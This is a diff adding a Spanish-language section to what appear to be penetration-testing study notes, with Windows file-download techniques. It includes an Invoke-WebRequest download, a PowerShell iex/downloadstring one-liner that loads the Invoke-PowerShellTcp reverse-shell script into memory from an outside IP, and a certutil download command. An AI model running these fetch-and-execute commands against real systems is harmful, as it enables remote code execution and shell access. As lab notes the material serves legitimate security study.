@@ -930,3 +930,33 @@ En kali seclist tiene nc.exe
 
 ```
 > https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
+
+
+## Descargar archivos
+
+Algunos comando no se pueden usar debido a las versiones de powershell por ejemplo el siguiente
+
+```
+Invoke-WebRequest -Uri 'http://192.168.230.128:8000/iisfinal.txt' -OutFile '.\iisfinal.txt'
+```
+
+Y la que por lo que entiendo carga ya el codigo en la memoria
+
+```
+powershell iex(new-object net.webclient).downloadstring('http://10.10.14.80:8000/Invoke-PowerShellTcp.ps1')
+```
+
+### Certutil 
+
+Esta herramienta es altamente detectada por windows ten cuidado...
+
+
+```
+certutil.exe -urlcache -split -f http://10.10.14.80:8000/iisfinal.txt iisfinal.txt
+
+```
+
+
+
+
+
